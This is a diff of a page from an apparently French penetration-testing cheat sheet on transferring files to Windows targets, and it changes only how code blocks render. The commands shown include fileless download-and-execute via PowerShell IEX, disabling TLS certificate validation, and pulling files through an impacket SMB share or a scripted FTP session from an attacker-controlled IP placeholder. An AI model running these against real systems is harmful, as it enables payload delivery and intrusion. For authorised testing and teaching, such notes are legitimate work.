@@ -7604,47 +7604,46 @@
   <h1>Télécharger depuis Windows</h1>
 
 <p>Envoie de fichier en base64:</p>
-<pre><code class="language-bash">cat $fichier |base64 -w 0;echo
-</code></pre>
-<pre><code class="language-powershell">[IO.File]::WriteAllBytes(&quot;C:\Users\Public\$fichier&quot;, [Convert]::FromBase64String(&quot;$base64&quot;))
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>cat<span class="w"> </span><span class="nv">$fichier</span><span class="w"> </span><span class="p">|</span>base64<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="p">;</span><span class="nb">echo</span>
+</span></code></pre></div>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="no">[IO.File]</span><span class="p">::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="s2">&quot;C:\Users\Public\$fichier&quot;</span><span class="p">,</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s2">&quot;$base64&quot;</span><span class="p">))</span>
+</span></code></pre></div>
 <p>Télécharger un fichier en powershell:</p>
-<pre><code class="language-powershell">
-(New-Object Net.WebClient).DownloadFileAsync('$url','$nomFichier')
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFileAsync</span><span class="p">(</span><span class="s1">&#39;$url&#39;</span><span class="p">,</span><span class="s1">&#39;$nomFichier&#39;</span><span class="p">)</span>
+</span></code></pre></div>
 <p>Télécharger un fichier en mémoire et l'exécuter (fileless):</p>
-<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('$Url_Script.ps1')
-
-ou
-
-(New-Object Net.WebClient).DownloadString('$Url_Script.ps1') | IEX
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;$Url_Script.ps1&#39;</span><span class="p">)</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">ou</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;$Url_Script.ps1&#39;</span><span class="p">)</span> <span class="p">|</span> <span class="nb">IEX</span>
+</span></code></pre></div>
 <p>Télécharger un fichier via Invoke-WebRequest (ou un de ses Alias: wget, curl, iwr):</p>
-<pre><code class="language-powershell">Invoke-WebRequest $url -OutFile $nomFichier
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">Invoke-WebRequest</span> <span class="nv">$url</span> <span class="n">-OutFile</span> <span class="nv">$nomFichier</span>
+</span></code></pre></div>
 <p>Bypasser un certificat untrusted:</p>
-<pre><code class="language-powershell">[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="no">[System.Net.ServicePointManager]</span><span class="p">::</span><span class="n">ServerCertificateValidationCallback</span> <span class="p">=</span> <span class="p">{</span><span class="nv">$true</span><span class="p">}</span>
+</span></code></pre></div>
 <p>Réception d'un fichier via création d'un partage SMB:</p>
-<pre><code class="language-bash">sudo impacket-smbserver share -smb2support /tmp/smbshare -user t3st -password p4ssword
-</code></pre>
-<pre><code class="language-powershell">net use n: \\$monip\share /user:t3st p4ssword
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>sudo<span class="w"> </span>impacket-smbserver<span class="w"> </span>share<span class="w"> </span>-smb2support<span class="w"> </span>/tmp/smbshare<span class="w"> </span>-user<span class="w"> </span>t3st<span class="w"> </span>-password<span class="w"> </span>p4ssword
+</span></code></pre></div>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">net</span> <span class="n">use</span> <span class="n">n</span><span class="p">:</span> <span class="p">\\</span><span class="nv">$monip</span><span class="p">\</span><span class="n">share</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">t3st</span> <span class="n">p4ssword</span>
+</span></code></pre></div>
 <p>Réception d'un fichier via création d'un serveur FTP:</p>
-<pre><code class="language-bash">sudo pip3 install pyftpdlib
-sudo python3 -m pyftpdlib --port 21
-</code></pre>
-<pre><code class="language-powershell">(New-Object Net.WebClient).DownloadFile('ftp://$monIp/file.txt', 'ftp-file.txt')
-
-Ou, en cas de shell non-interractif:
-
-echo open $monIp &gt; ftpcommand.txt
-echo USER anonymous &gt;&gt; ftpcommand.txt
-echo binary &gt;&gt; ftpcommand.txt
-echo GET file.txt &gt;&gt; ftpcommand.txt
-echo bye &gt;&gt; ftpcommand.txt
-ftp -v -n -s:ftpcommand.txt
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>sudo<span class="w"> </span>pip3<span class="w"> </span>install<span class="w"> </span>pyftpdlib
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>sudo<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>pyftpdlib<span class="w"> </span>--port<span class="w"> </span><span class="m">21</span>
+</span></code></pre></div>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">&#39;ftp://$monIp/file.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;ftp-file.txt&#39;</span><span class="p">)</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">Ou</span><span class="p">,</span> <span class="n">en</span> <span class="n">cas</span> <span class="n">de</span> <span class="n">shell</span> <span class="n">non-interractif</span><span class="p">:</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="nb">echo </span><span class="n">open</span> <span class="nv">$monIp</span> <span class="p">&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="nb">echo </span><span class="n">USER</span> <span class="n">anonymous</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="nb">echo </span><span class="n">binary</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="nb">echo </span><span class="n">GET</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="nb">echo </span><span class="n">bye</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="n">ftp</span> <span class="n">-v</span> <span class="n">-n</span> <span class="n">-s</span><span class="p">:</span><span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div>
 
 
 
@@ -7691,7 +7690,7 @@ ftp -v -n -s:ftpcommand.txt
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
